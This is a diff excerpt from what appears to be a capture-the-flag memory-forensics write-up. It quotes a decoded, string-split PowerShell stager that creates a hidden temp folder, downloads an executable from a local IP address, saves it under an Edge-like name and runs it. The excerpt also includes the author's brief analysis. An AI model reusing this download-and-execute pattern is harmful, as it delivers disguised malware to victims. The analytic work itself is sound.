@@ -90,9 +90,10 @@ The file seem to be executing a powershell script after decode the string here t
 $u='ht'+'tp://192.168.0.16:8282/B64_dec'+'ode_RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ==/chall_mem_s'+'.arch.e'+'.xe';$t='Wan'+'iT'+'.mkdir -force $env:TMP\\.$t;try{iwgr -OutFile $d\\msedg.exe;& $d\\msedg.exe;}catch{}
 
 ```
-
+```
 URL: **http://192.168.0.16:8282/B64_decode_RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ==/chall_mem_search.exe**
 Assigns the directory $env:TMP\\WanIT
+```
 Its attempts to download the file **msedge.exe** from the URL into the directory and then executes it.
 so we know the malware name, its **"msedge.exe"** so I need search then dump it out.
 
